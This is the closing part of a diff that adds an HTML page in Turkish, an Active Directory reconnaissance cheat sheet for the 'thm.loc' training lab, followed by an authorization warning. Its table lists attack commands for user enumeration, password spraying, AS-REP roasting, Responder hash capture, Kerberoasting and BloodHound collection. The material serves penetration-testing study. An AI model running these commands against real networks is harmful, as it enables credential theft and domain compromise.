+        <tr><td>Kullanıcı doğrulama</td><td>kerbrute</td><td><code>kerbrute userenum -d thm.loc --dc IP users.txt</code></td></tr>
+        <tr><td>Parola (Password123!)</td><td>nxc / kerbrute (spray)</td><td><code>nxc smb IP -u users.txt -p 'Parola'</code></td></tr>
+        <tr><td>Hash (auth'suz)</td><td>impacket-GetNPUsers</td><td><code>impacket-GetNPUsers thm.loc/ -usersfile ...</code></td></tr>
+        <tr><td>NTLM hash (ağdan)</td><td>Responder</td><td><code>sudo responder -I eth0</code></td></tr>
+        <tr><td>SPN hesapları</td><td>impacket-GetUserSPNs</td><td><code>impacket-GetUserSPNs thm.loc/claire:...</code></td></tr>
+        <tr><td>Envanter raporu</td><td>ldapdomaindump</td><td><code>ldapdomaindump ldap://IP -u ... -p ...</code></td></tr>
+        <tr><td>Yetki yolları</td><td>bloodhound-python</td><td><code>bloodhound-python -u ... -c All --zip</code></td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="warnbox" style="margin-top:24px">
+    <b>Yasal / Etik uyarı:</b> Bu araçları yalnızca <b>yazılı izin (scope/authorization)</b> aldığın sistemlerde kullan. Password spraying, Responder aktif modu ve hash kırma <b>aktif müdahalelerdir</b> — account-lockout, hizmet kesintisi ve yasal sonuç doğurabilir. Kapsam ve politikayı bilmeden çalıştırma.
+  </div>
+
+  <footer>
+    Active Directory İlk Keşif · thm.loc lab · Host → Domain → Share → User → Password → SPN<br>
+    İleri aşamalar için: <code>AD-Pentest-Yol-Haritasi.html</code>
+  </footer>
+
+</div>
+
+<a href="#" class="backtop" title="Başa dön">↑</a>
+
+</body>
+</html>
